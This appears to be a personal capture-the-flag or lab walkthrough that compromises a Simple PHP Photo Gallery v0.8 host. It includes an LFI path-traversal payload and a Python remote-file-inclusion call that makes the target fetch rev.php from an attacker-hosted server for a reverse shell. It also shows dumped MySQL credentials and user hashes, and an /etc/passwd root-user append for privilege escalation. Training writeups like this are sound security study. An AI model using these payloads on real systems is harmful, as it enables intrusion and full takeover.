nmap shows ports 21 ftp, 22 ssh, 80 web, 111 rpc, 139 samba, 445 samba, 3306 mysql

ftp anon times out
web shows Simple PHP Photo Gallery v0.8
google for exploit, right off the bat, lfi exploit publicly available
```txt
[!] EXPLOIT: /[path]/index.php?preview=[local_file]%00
[path]/index.php?preview=../../../../../../../../../../../../etc/passwd%00
```

that one doesnt work, the next one, was better
```python
# Default config uses $_GET['i'] but orignal finding uses $_GET['img'] lets try both?
getrequest_i = requests.get(url + '/image.php?i=http://'+ attackerip +':'+ httpportstr +'/rev.php', verify=False)
getrequest = requests.get(url + '/image.php?img=http://'+ attackerip +':'+ httpportstr +'/rev.php', verify=False)
```
we try hosting python http server, to check if we'll get any hits using burp
`GET /image.php?i=http://192.168.45.247/rev.php HTTP/1.1` doesnt work, but
`GET /image.php?img=http://192.168.45.247/rev.php HTTP/1.1` gives a hit!

So now, we host a rev.php
we get hit on the python server, and the message at the end of webpage "failed to deamonize", which means the script ran, but failed to give me a rev shell
we try a different php rev shell, and the actual exploit itself, none work

So we try the /etc/passwd --> /usr/name/.ssh/id_rsa

Nothing was working, then we go to a walkthrough to see what port they used for listener
HINT TAKEN : used port 21
apache!

---
in /var/www/html/ we find a db.php
we find root:MalapropDoffUtilize1337 for db SimplePHPGal

`mysql -h 192.168.244.58 -u root -p`
but we get an error, claiming it cant veriy authenticity of us as a host
so we try the same from target machine, and we get in

`mysql -h 127.0.0.1 -u root -p`
`show databases; use SimplePHPGal; show tables; select * from users;`
```
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
```

we su as micheal, no other users exist
internal listening port udp 323

we run linpeas, and find we have writable /etc/passwd file
so,
`echo "root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash" >> /etc/passwd`
`su root2 #--> w00t password`